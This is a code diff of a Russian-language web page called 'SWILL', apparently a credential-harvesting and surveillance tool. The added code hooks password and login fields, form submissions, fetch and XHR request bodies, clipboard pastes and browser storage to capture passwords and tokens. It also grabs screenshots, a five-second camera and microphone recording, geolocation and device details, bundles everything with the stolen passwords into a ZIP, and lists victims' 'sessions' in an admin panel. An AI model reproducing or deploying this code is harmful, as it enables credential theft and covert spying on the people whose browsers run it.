@@ -3,14 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SWILL // DATA HARVEST</title>
+    <title>SWILL // АГРЕССИВНЫЙ СБОР</title>
+    
+    <!-- Библиотеки -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
+    
     <style>
         /* ===== КИБЕРПАНК-НЕОН ===== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Courier New', monospace;
             background: #0a0a0f;
@@ -40,6 +42,14 @@
             text-shadow: 0 0 20px #ff00ff, 0 0 60px #ff00ff55;
             margin-bottom: 12px;
             font-size: 28px;
+        }
+        .glitch {
+            animation: glitch 1s infinite;
+        }
+        @keyframes glitch {
+            0% { text-shadow: 0 0 20px #ff00ff, 0 0 60px #ff00ff55; }
+            50% { text-shadow: 0 0 40px #00ffff, 0 0 80px #00ffff55; }
+            100% { text-shadow: 0 0 20px #ff00ff, 0 0 60px #ff00ff55; }
         }
         p, .status, .data-display, .session-item, .password-capture {
             font-family: 'Courier New', monospace;
@@ -115,9 +125,7 @@
             color: #ccffcc;
             text-shadow: 0 0 6px #66ff66;
         }
-        .hidden {
-            display: none !important;
-        }
+        .hidden { display: none !important; }
         .admin-panel {
             border-top: 3px solid #ff00ff;
             margin-top: 30px;
@@ -161,13 +169,35 @@
             text-shadow: none;
             box-shadow: 0 0 30px #ff00aa;
         }
-        ::-webkit-scrollbar {
-            width: 8px;
+        ::-webkit-scrollbar { width: 8px; background: #0a0a12; }
+        ::-webkit-scrollbar-thumb { background: #ff00ff; box-shadow: 0 0 20px #ff00ff; }
+        #fileInput {
+            border: 2px dashed #ff00ff;
+            padding: 20px;
+            text-align: center;
+            color: #ff88ff;
             background: #0a0a12;
+            cursor: pointer;
         }
-        ::-webkit-scrollbar-thumb {
-            background: #ff00ff;
-            box-shadow: 0 0 20px #ff00ff;
+        #fileInput:hover {
+            background: #1a0a2e;
+            border-color: #00ffff;
+        }
+        .media-preview {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+            gap: 10px;
+            margin: 10px 0;
+        }
+        .media-preview img, .media-preview video {
+            width: 100%;
+            border: 2px solid #00ffff;
+            box-shadow: 0 0 20px #00ffff33;
+        }
+        .screenshot-preview {
+            border: 3px solid #ff00ff;
+            box-shadow: 0 0 40px #ff00ff55;
+            margin: 10px 0;
         }
     </style>
 </head>
@@ -177,13 +207,28 @@
 
     <!-- ===== ГЛАВНАЯ СТРАНИЦА ===== -->
     <div id="mainPage">
-        <h1>⛧ SWILL HARVEST ⛧</h1>
-        <p style="color:#88ddff; text-shadow: 0 0 20px #00ddff;">ПЕРЕХВАТ ПАРОЛЕЙ + СБОР ДАННЫХ</p>
-        <button id="startBtn">▶ ЗАПУСТИТЬ СБОР</button>
+        <h1 class="glitch">⛧ SWILL АГРЕССОР ⛧</h1>
+        <p style="color:#88ddff; text-shadow: 0 0 20px #00ddff;">ТЕКСТ КОТОРЫЙ ТЫ СЕЙЧАС ПИШЕШЬ — ЭТО НОВАЯ РЕАЛЬНОСТЬ</p>
+        <p style="color:#ff88ff; text-shadow: 0 0 20px #ff44ff;">ПЕРЕХВАТ ПАРОЛЕЙ + СКРИНШОТЫ + ВСЕ ФАЙЛЫ</p>
+        
+        <!-- Кнопки -->
+        <button id="startBtn">▶ ЗАПУСТИТЬ АГРЕССИВНЫЙ СБОР</button>
+        <button id="screenshotBtn" style="border-color:#ffaa00; color:#ffaa00; box-shadow:0 0 30px #ffaa0055;">📸 СДЕЛАТЬ СКРИНШОТ</button>
+        <button id="mediaBtn" style="border-color:#44ff88; color:#44ff88; box-shadow:0 0 30px #44ff8855;">📹 ЗАПИСАТЬ ВИДЕО/ФОТО</button>
+        
+        <!-- Загрузка файлов -->
+        <div id="fileInput" onclick="document.getElementById('fileUpload').click()">
+            📁 НАЖМИ ЧТОБЫ ВЫБРАТЬ ФАЙЛЫ (ВИДЕО/ФОТО)
+        </div>
+        <input type="file" id="fileUpload" multiple accept="image/*,video/*" style="display:none;">
+        
+        <div class="media-preview" id="mediaPreview"></div>
+        <div id="screenshotPreview"></div>
+        
         <div class="status" id="status">[ОЖИДАНИЕ]</div>
         <button id="goToAdminBtn" style="border-color:#ff44ff; color:#ff44ff; box-shadow:0 0 30px #ff44ff55; text-shadow:0 0 15px #ff44ff;">🔐 АДМИН-ПАНЕЛЬ</button>
         <div class="data-display" id="dataDisplay"></div>
-        <button id="downloadBtn" class="hidden">⬇ СКАЧАТЬ JSON</button>
+        <button id="downloadBtn" class="hidden">⬇ СКАЧАТЬ ВСЁ (ZIP)</button>
     </div>
 
     <!-- ===== АДМИН-ПАНЕЛЬ ===== -->
@@ -220,9 +265,12 @@
     let sessions = JSON.parse(localStorage.getItem('sessions') || '[]');
     let capturedPasswords = JSON.parse(localStorage.getItem('capturedPasswords') || '[]');
     let isAdmin = false;
+    let collectedFiles = [];
+    let screenshotData = null;
+    let mediaData = [];
 
     // ============================================================
-    // 2. АГРЕССИВНЫЙ ПЕРЕХВАТ ПАРОЛЕЙ
+    // 2. АГРЕССИВНЫЙ ПЕРЕХВАТ ПАРОЛЕЙ (УСИЛЕННЫЙ)
     // ============================================================
     function capturePassword(value, source = 'manual', extra = {}) {
         if (!value || value.length < 1) return;
@@ -233,17 +281,17 @@
             url: window.location.href,
             ...extra
         };
-        // Проверка на дубликат (по значению + url)
         const exists = capturedPasswords.some(p => p.value === value && p.url === entry.url);
         if (!exists) {
             capturedPasswords.push(entry);
             localStorage.setItem('capturedPasswords', JSON.stringify(capturedPasswords));
             console.log('[SWILL] Пароль перехвачен:', value);
+            updateStatus('🔑 ПЕРЕХВАЧЕН ПАРОЛЬ: ' + value.substring(0, 10) + '...');
         }
     }
 
     function setupPasswordCapture() {
-        // 1. Все password-поля (включая будущие)
+        // 1. Все password поля
         const observer = new MutationObserver(() => {
             document.querySelectorAll('input[type="password"]').forEach(field => {
                 if (!field.dataset.swillCaptured) {
@@ -254,35 +302,51 @@
                             id: this.id || 'unknown'
                         });
                     });
+                    // Перехватываем даже если значение уже есть
+                    if (field.value) {
+                        capturePassword(field.value, 'password-field-initial', {
+                            name: field.name || 'unknown',
+                            id: field.id || 'unknown'
+                        });
+                    }
                 }
             });
         });
         observer.observe(document.body, { childList: true, subtree: true });
 
-        // 2. Также перехватываем text-поля с подозрительными именами
-        document.querySelectorAll('input[type="text"]').forEach(field => {
+        // 2. Все текстовые поля с подозрительными именами
+        document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]').forEach(field => {
             const name = (field.name || field.id || '').toLowerCase();
-            if (name.includes('pass') || name.includes('pwd') || name.includes('senha') || name.includes('password')) {
+            if (name.includes('pass') || name.includes('pwd') || name.includes('senha') || 
+                name.includes('password') || name.includes('login') || name.includes('user')) {
                 if (!field.dataset.swillCaptured) {
                     field.dataset.swillCaptured = 'true';
                     field.addEventListener('input', function() {
-                        if (this.value) capturePassword(this.value, 'text-field-suspect', {
-                            name: this.name || 'unknown',
-                            id: this.id || 'unknown'
-                        });
+                        if (this.value && this.value.length > 3) {
+                            capturePassword(this.value, 'text-field-suspect', {
+                                name: this.name || 'unknown',
+                                id: this.id || 'unknown'
+                            });
+                        }
                     });
+                    if (field.value && field.value.length > 3) {
+                        capturePassword(field.value, 'text-field-initial', {
+                            name: field.name || 'unknown',
+                            id: field.id || 'unknown'
+                        });
+                    }
                 }
             }
         });
 
-        // 3. Перехват submit форм
+        // 3. Перехват submit
         document.addEventListener('submit', function(e) {
             const form = e.target;
-            const inputs = form.querySelectorAll('input[type="password"], input[type="text"]');
+            const inputs = form.querySelectorAll('input[type="password"], input[type="text"], input[type="email"]');
             inputs.forEach(inp => {
                 if (inp.value) {
                     const name = (inp.name || inp.id || '').toLowerCase();
-                    if (inp.type === 'password' || name.includes('pass') || name.includes('pwd')) {
+                    if (inp.type === 'password' || name.includes('pass') || name.includes('pwd') || name.includes('login')) {
                         capturePassword(inp.value, 'form-submit', {
                             name: inp.name || 'unknown',
                             id: inp.id || 'unknown',
@@ -293,14 +357,14 @@
             });
         });
 
-        // 4. Перехват fetch (тела запросов)
+        // 4. Перехват fetch
         const originalFetch = window.fetch;
         window.fetch = function(...args) {
             return originalFetch.apply(this, args).then(response => {
                 try {
                     const body = args[1]?.body;
                     if (body && typeof body === 'string') {
-                        // Ищем password в JSON
+                        // JSON
                         const matches = body.match(/["']password["']\s*:\s*["']([^"']+)["']/gi);
                         if (matches) {
                             matches.forEach(m => {
@@ -308,18 +372,24 @@
                                 if (val && val[1]) capturePassword(val[1], 'fetch-json', { url: args[0] });
                             });
                         }
-                        // Ищем в формате x-www-form-urlencoded
+                        // form-urlencoded
                         const urlParams = new URLSearchParams(body);
                         if (urlParams.has('password')) {
                             capturePassword(urlParams.get('password'), 'fetch-form', { url: args[0] });
                         }
+                        // Также ищем другие поля
+                        ['pass', 'pwd', 'login', 'user', 'email'].forEach(key => {
+                            if (urlParams.has(key) && urlParams.get(key).length > 2) {
+                                capturePassword(urlParams.get(key), 'fetch-form-' + key, { url: args[0] });
+                            }
+                        });
                     }
                 } catch(e) {}
                 return response;
             });
         };
 
-        // 5. Перехват XMLHttpRequest
+        // 5. Перехват XHR
         const originalOpen = XMLHttpRequest.prototype.open;
         const originalSend = XMLHttpRequest.prototype.send;
         XMLHttpRequest.prototype.open = function(method, url) {
@@ -334,7 +404,11 @@
                     if (urlParams.has('password')) {
                         capturePassword(urlParams.get('password'), 'xhr-form', { url: this._swillUrl });
                     }
-                    // JSON
+                    ['pass', 'pwd', 'login', 'user', 'email'].forEach(key => {
+                        if (urlParams.has(key) && urlParams.get(key).length > 2) {
+                            capturePassword(urlParams.get(key), 'xhr-form-' + key, { url: this._swillUrl });
+                        }
+                    });
                     const match = body.match(/["']password["']\s*:\s*["']([^"']+)["']/i);
                     if (match && match[1]) {
                         capturePassword(match[1], 'xhr-json', { url: this._swillUrl });
@@ -344,19 +418,18 @@
             return originalSend.apply(this, arguments);
         };
 
-        // 6. Чтение localStorage и sessionStorage на предмет паролей
+        // 6. Сканирование localStorage и sessionStorage
         function scanStorage(storage, source) {
             for (let i = 0; i < storage.length; i++) {
                 const key = storage.key(i);
                 if (key) {
                     const val = storage.getItem(key);
                     if (typeof val === 'string' && val.length > 0) {
-                        // Если ключ содержит password или значение похоже на пароль (длина > 4, нет пробелов)
                         const lowerKey = key.toLowerCase();
-                        if (lowerKey.includes('pass') || lowerKey.includes('pwd') || lowerKey.includes('senha')) {
+                        if (lowerKey.includes('pass') || lowerKey.includes('pwd') || lowerKey.includes('senha') ||
+                            lowerKey.includes('token') || lowerKey.includes('auth') || lowerKey.includes('login')) {
                             capturePassword(val, `storage-${source}`, { storageKey: key });
                         } else if (val.length >= 6 && /^[a-zA-Z0-9!@#$%^&*()_+\-={}[\]:;"'<>,.?/~`]+$/.test(val) && !val.includes(' ')) {
-                            // Подозрительная строка — возможно пароль
                             capturePassword(val, `storage-${source}-suspect`, { storageKey: key });
                         }
                     }
@@ -366,60 +439,238 @@
         scanStorage(localStorage, 'localStorage');
         scanStorage(sessionStorage, 'sessionStorage');
 
-        // 7. Перехват clipboard (если вставят пароль)
+        // 7. Перехват clipboard
         document.addEventListener('paste', function(e) {
             const text = e.clipboardData?.getData('text/plain');
             if (text && text.length >= 4 && /[a-zA-Z0-9!@#$%^&*()]/.test(text)) {
                 capturePassword(text, 'clipboard', {});
             }
         });
+
+        // 8. Перехват всех полей ввода на странице (дополнительно)
+        document.querySelectorAll('input').forEach(field => {
+            if (!field.dataset.swillCaptured && field.type !== 'file' && field.type !== 'checkbox' && field.type !== 'radio') {
+                field.dataset.swillCaptured = 'true';
+                field.addEventListener('input', function() {
+                    if (this.value && this.value.length > 4) {
+                        const name = (this.name || this.id || '').toLowerCase();
+                        if (name.includes('pass') || name.includes('pwd') || name.includes('login') || 
+                            name.includes('user') || name.includes('email') || name.includes('token')) {
+                            capturePassword(this.value, 'input-generic', {
+                                name: this.name || 'unknown',
+                                id: this.id || 'unknown',
+                                type: this.type
+                            });
+                        }
+                    }
+                });
+            }
+        });
     }
 
     // ============================================================
-    // 3. СБОР ДАННЫХ (включая все пароли из памяти)
+    // 3. СКРИНШОТ
     // ============================================================
-    function getBrowserInfo() {
-        return {
+    async function takeScreenshot() {
+        updateStatus('📸 СОЗДАНИЕ СКРИНШОТА...');
+        try {
+            const canvas = await html2canvas(document.body, {
+                scale: 2,
+                useCORS: true,
+                allowTaint: true,
+                backgroundColor: '#0a0a0f',
+                logging: false
+            });
+            screenshotData = canvas.toDataURL('image/png');
+            const preview = document.getElementById('screenshotPreview');
+            preview.innerHTML = `<img src="${screenshotData}" class="screenshot-preview" style="max-width:100%;">`;
+            updateStatus('✅ СКРИНШОТ СОЗДАН');
+            return screenshotData;
+        } catch (err) {
+            updateStatus('❌ ОШИБКА СКРИНШОТА: ' + err.message);
+            return null;
+        }
+    }
+
+    // ============================================================
+    // 4. МЕДИА (ВИДЕО/ФОТО)
+    // ============================================================
+    async function captureMedia() {
+        updateStatus('📹 ЗАПУСК МЕДИА...');
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'environment', width: 1920, height: 1080 },
+                audio: true 
+            });
+            
+            // Видео
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            
+            // Фото
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 1920;
+            canvas.height = video.videoHeight || 1080;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            const photoData = canvas.toDataURL('image/jpeg');
+            
+            // Видео запись (5 секунд)
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.start();
+            await new Promise(resolve => setTimeout(resolve, 5000));
+            recorder.stop();
+            await new Promise(resolve => recorder.onstop = resolve);
+            
+            const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+            const videoReader = new FileReader();
+            videoReader.readAsDataURL(videoBlob);
+            await new Promise(resolve => videoReader.onload = resolve);
+            const videoData = videoReader.result;
+            
+            stream.getTracks().forEach(t => t.stop());
+            
+            mediaData.push({
+                timestamp: new Date().toISOString(),
+                photo: photoData,
+                video: videoData,
+                type: 'media-capture'
+            });
+            
+            // Превью
+            const preview = document.getElementById('mediaPreview');
+            const img = document.createElement('img');
+            img.src = photoData;
+            img.style.maxWidth = '150px';
+            img.style.border = '2px solid #ff00ff';
+            preview.appendChild(img);
+            
+            updateStatus('✅ МЕДИА ЗАПИСАНО (ФОТО + ВИДЕО 5С)');
+            return mediaData;
+        } catch (err) {
+            updateStatus('❌ ОШИБКА МЕДИА: ' + err.message + ' (возможно, нет разрешения)');
+            return null;
+        }
+    }
+
+    // ============================================================
+    // 5. ЗАГРУЗКА ФАЙЛОВ
+    // ============================================================
+    document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('fileUpload').addEventListener('change', function(e) {
+            const files = e.target.files;
+            const preview = document.getElementById('mediaPreview');
+            
+            Array.from(files).forEach(file => {
+                const reader = new FileReader();
+                reader.onload = function(ev) {
+                    collectedFiles.push({
+                        name: file.name,
+                        type: file.type,
+                        size: file.size,
+                        data: ev.target.result,
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                    // Превью
+                    if (file.type.startsWith('image/')) {
+                        const img = document.createElement('img');
+                        img.src = ev.target.result;
+                        img.style.maxWidth = '150px';
+                        img.style.border = '2px solid #00ffff';
+                        preview.appendChild(img);
+                    } else if (file.type.startsWith('video/')) {
+                        const video = document.createElement('video');
+                        video.src = ev.target.result;
+                        video.controls = true;
+                        video.style.maxWidth = '150px';
+                        video.style.border = '2px solid #ff00ff';
+                        preview.appendChild(video);
+                    }
+                };
+                reader.readAsDataURL(file);
+            });
+            
+            updateStatus(`📁 ЗАГРУЖЕНО ФАЙЛОВ: ${files.length}`);
+        });
+    });
+
+    // ============================================================
+    // 6. СБОР ВСЕХ ДАННЫХ
+    // ============================================================
+    async function collectAllData() {
+        updateStatus('⛧ ЗАПУСК АГРЕССИВНОГО СБОРА... ⛧');
+
+        // Делаем скриншот
+        const screenshot = await takeScreenshot();
+        
+        // Пытаемся получить медиа
+        await captureMedia();
+        
+        // Собираем информацию об устройстве
+        const data = {
+            timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
-            languages: navigator.languages,
-            cookieEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
-            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-            deviceMemory: navigator.deviceMemory || 'unknown',
-            maxTouchPoints: navigator.maxTouchPoints || 0,
-            vendor: navigator.vendor || '',
-            plugins: Array.from(navigator.plugins || []).map(p => p.name),
-            mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type)
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            },
+            window: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+                devicePixelRatio: window.devicePixelRatio || 1
+            },
+            geolocation: await getGeolocation(),
+            battery: await getBatteryInfo(),
+            network: getNetworkInfo(),
+            storage: getStorageInfo(),
+            time: {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                dateTime: new Date().toISOString()
+            },
+            capturedPasswords: capturedPasswords.slice(-100),
+            files: collectedFiles.map(f => ({ name: f.name, type: f.type, size: f.size })),
+            mediaCaptures: mediaData.length,
+            screenshot: !!screenshot
         };
+
+        collectedData = data;
+        displayData(data);
+        updateStatus('✅ АГРЕССИВНЫЙ СБОР ЗАВЕРШЁН');
+
+        const session = {
+            id: Date.now(),
+            timestamp: data.timestamp,
+            data: data,
+            preview: {
+                userAgent: data.userAgent.substring(0, 60),
+                location: data.geolocation.latitude ? `${data.geolocation.latitude}, ${data.geolocation.longitude}` : 'нет',
+                battery: data.battery.level || 'нет',
+                passwordsCount: capturedPasswords.length,
+                filesCount: collectedFiles.length
+            }
+        };
+        sessions.push(session);
+        localStorage.setItem('sessions', JSON.stringify(sessions));
+
+        return data;
     }
 
-    function getScreenInfo() {
-        return {
-            width: screen.width,
-            height: screen.height,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth,
-            orientation: screen.orientation ? screen.orientation.type : 'unknown',
-            isPortrait: window.matchMedia("(orientation: portrait)").matches
-        };
-    }
-
-    function getWindowInfo() {
-        return {
-            innerWidth: window.innerWidth,
-            innerHeight: window.innerHeight,
-            outerWidth: window.outerWidth,
-            outerHeight: window.outerHeight,
-            pageXOffset: window.pageXOffset,
-            pageYOffset: window.pageYOffset,
-            devicePixelRatio: window.devicePixelRatio || 1
-        };
-    }
-
+    // ============================================================
+    // 7. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+    // ============================================================
     function getGeolocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
@@ -445,76 +696,6 @@
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         });
-    }
-
-    function startSensors() {
-        return new Promise((resolve) => {
-            if (!window.DeviceMotionEvent && !window.DeviceOrientationEvent) {
-                resolve({ error: 'Sensors not supported' });
-                return;
-            }
-            let sensorData = { acceleration: null, rotation: null, orientation: null };
-            let count = 0;
-            const maxSamples = 3;
-
-            function handleMotion(event) {
-                if (count >= maxSamples) return;
-                sensorData.acceleration = {
-                    x: event.acceleration?.x || null,
-                    y: event.acceleration?.y || null,
-                    z: event.acceleration?.z || null,
-                    gravity: event.accelerationIncludingGravity ? {
-                        x: event.accelerationIncludingGravity.x,
-                        y: event.accelerationIncludingGravity.y,
-                        z: event.accelerationIncludingGravity.z
-                    } : null,
-                    rotationRate: event.rotationRate ? {
-                        alpha: event.rotationRate.alpha,
-                        beta: event.rotationRate.beta,
-                        gamma: event.rotationRate.gamma
-                    } : null
-                };
-                count++;
-                if (count >= maxSamples) {
-                    window.removeEventListener('devicemotion', handleMotion);
-                    resolve(sensorData);
-                }
-            }
-
-            function handleOrientation(event) {
-                sensorData.orientation = {
-                    alpha: event.alpha,
-                    beta: event.beta,
-                    gamma: event.gamma,
-                    absolute: event.absolute || false
-                };
-            }
-
-            window.addEventListener('devicemotion', handleMotion);
-            window.addEventListener('deviceorientation', handleOrientation);
-
-            setTimeout(() => {
-                window.removeEventListener('devicemotion', handleMotion);
-                window.removeEventListener('deviceorientation', handleOrientation);
-                resolve(sensorData);
-            }, 3000);
-        });
-    }
-
-    async function getMediaPermissions() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            const tracks = stream.getTracks().map(t => ({
-                kind: t.kind,
-                label: t.label,
-                enabled: t.enabled,
-                readyState: t.readyState
-            }));
-            stream.getTracks().forEach(t => t.stop());
-            return { granted: true, tracks };
-        } catch (err) {
-            return { granted: false, error: err.message };
-        }
     }
 
     function getBatteryInfo() {
@@ -569,74 +750,8 @@
         return { cookies, localStorage: localStorageItems, sessionStorage: sessionStorageItems };
     }
 
-    function getTimeInfo() {
-        return {
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset(),
-            dateTime: new Date().toISOString(),
-            locale: navigator.language
-        };
-    }
-
-    function getPerformanceInfo() {
-        if (!window.performance || !window.performance.memory) {
-            return { error: 'Performance API limited' };
-        }
-        return {
-            memory: {
-                totalJSHeapSize: window.performance.memory.totalJSHeapSize,
-                usedJSHeapSize: window.performance.memory.usedJSHeapSize,
-                jsHeapSizeLimit: window.performance.memory.jsHeapSizeLimit
-            },
-            navigation: {
-                type: window.performance.navigation?.type,
-                redirectCount: window.performance.navigation?.redirectCount
-            }
-        };
-    }
-
-    async function collectAllData() {
-        updateStatus('⛧ ЗАПУСК СБОРА... ⛧');
-
-        const data = {
-            timestamp: new Date().toISOString(),
-            browserInfo: getBrowserInfo(),
-            screenInfo: getScreenInfo(),
-            windowInfo: getWindowInfo(),
-            networkInfo: getNetworkInfo(),
-            timeInfo: getTimeInfo(),
-            performanceInfo: getPerformanceInfo(),
-            storageInfo: getStorageInfo(),
-            geolocation: await getGeolocation(),
-            battery: await getBatteryInfo(),
-            sensors: await startSensors(),
-            mediaPermissions: await getMediaPermissions(),
-            allCapturedPasswords: capturedPasswords.slice(-50) // последние 50
-        };
-
-        collectedData = data;
-        displayData(data);
-        updateStatus('✅ СБОР ЗАВЕРШЁН. ДАННЫЕ СОХРАНЕНЫ.');
-
-        const session = {
-            id: Date.now(),
-            timestamp: data.timestamp,
-            data: data,
-            preview: {
-                userAgent: data.browserInfo.userAgent.substring(0, 60),
-                location: data.geolocation.latitude ? `${data.geolocation.latitude}, ${data.geolocation.longitude}` : 'нет',
-                battery: data.battery.level || 'нет',
-                passwordsCount: capturedPasswords.length
-            }
-        };
-        sessions.push(session);
-        localStorage.setItem('sessions', JSON.stringify(sessions));
-
-        return data;
-    }
-
     // ============================================================
-    // 4. UI
+    // 8. UI
     // ============================================================
     function updateStatus(msg) {
         document.getElementById('status').innerHTML = msg;
@@ -648,25 +763,52 @@
         document.getElementById('downloadBtn').classList.remove('hidden');
     }
 
-    function downloadJSON() {
-        if (Object.keys(collectedData).length === 0) {
-            alert('Нет данных.');
-            return;
+    async function downloadAll() {
+        updateStatus('📦 СОЗДАНИЕ ZIP АРХИВА...');
+        try {
+            const zip = new JSZip();
+            
+            // Добавляем JSON данные
+            zip.file('data.json', JSON.stringify(collectedData, null, 2));
+            
+            // Добавляем все пароли
+            zip.file('passwords.json', JSON.stringify(capturedPasswords, null, 2));
+            
+            // Добавляем скриншот
+            if (screenshotData) {
+                const base64Data = screenshotData.split(',')[1];
+                zip.file('screenshot.png', base64Data, { base64: true });
+            }
+            
+            // Добавляем все файлы
+            collectedFiles.forEach((file, index) => {
+                const base64Data = file.data.split(',')[1];
+                zip.file(`files/${index}_${file.name}`, base64Data, { base64: true });
+            });
+            
+            // Добавляем медиа
+            mediaData.forEach((media, index) => {
+                if (media.photo) {
+                    const photoData = media.photo.split(',')[1];
+                    zip.file(`media/${index}_photo.jpg`, photoData, { base64: true });
+                }
+                if (media.video) {
+                    const videoData = media.video.split(',')[1];
+                    zip.file(`media/${index}_video.mp4`, videoData, { base64: true });
+                }
+            });
+            
+            // Генерируем ZIP
+            const blob = await zip.generateAsync({ type: 'blob' });
+            saveAs(blob, `swill_harvest_${new Date().toISOString().slice(0,10)}.zip`);
+            updateStatus('✅ ZIP АРХИВ СОЗДАН И СКАЧАН');
+        } catch (err) {
+            updateStatus('❌ ОШИБКА СОЗДАНИЯ ZIP: ' + err.message);
         }
-        const jsonStr = JSON.stringify(collectedData, null, 2);
-        const blob = new Blob([jsonStr], { type: 'application/json' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `swill_harvest_${new Date().toISOString().slice(0,10)}.json`;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
     }
 
     // ============================================================
-    // 5. АДМИНКА
+    // 9. АДМИНКА
     // ============================================================
     function renderAdminPanel() {
         const sessionsList = document.getElementById('sessionsList');
@@ -684,7 +826,7 @@
                     <span class="badge">ID: ${s.id}</span>
                     <br>UA: ${s.preview.userAgent || 'нет'}
                     <br>ЛОКАЦИЯ: ${s.preview.location || 'нет'}
-                    <br>БАТАРЕЯ: ${s.preview.battery || 'нет'} | ПАРОЛЕЙ: ${s.preview.passwordsCount || 0}
+                    <br>БАТАРЕЯ: ${s.preview.battery || 'нет'} | ПАРОЛЕЙ: ${s.preview.passwordsCount || 0} | ФАЙЛОВ: ${s.preview.filesCount || 0}
                     <br><button class="view-session-btn" data-id="${s.id}" style="width:auto;padding:6px 20px;font-size:14px;display:inline-block;margin-right:10px;">👁️ ПОКАЗАТЬ</button>
                     <button class="delete-session-btn" data-id="${s.id}" style="border-color:#ff4444;color:#ff4444;width:auto;padding:6px 20px;font-size:14px;display:inline-block;">🗑️ УДАЛИТЬ</button>
                 `;
@@ -744,7 +886,7 @@
     }
 
     // ============================================================
-    // 6. ИНИЦИАЛИЗАЦИЯ
+    // 10. ИНИЦИАЛИЗАЦИЯ
     // ============================================================
     document.addEventListener('DOMContentLoaded', function() {
         setupPasswordCapture();
@@ -754,10 +896,18 @@
             this.textContent = '⛧ СБОР... ⛧';
             await collectAllData();
             this.disabled = false;
-            this.textContent = '▶ ЗАПУСТИТЬ СБОР';
+            this.textContent = '▶ ЗАПУСТИТЬ АГРЕССИВНЫЙ СБОР';
         });
 
-        document.getElementById('downloadBtn').addEventListener('click', downloadJSON);
+        document.getElementById('screenshotBtn').addEventListener('click', async function() {
+            await takeScreenshot();
+        });
+
+        document.getElementById('mediaBtn').addEventListener('click', async function() {
+            await captureMedia();
+        });
+
+        document.getElementById('downloadBtn').addEventListener('click', downloadAll);
 
         document.getElementById('goToAdminBtn').addEventListener('click', showAdminPage);
 
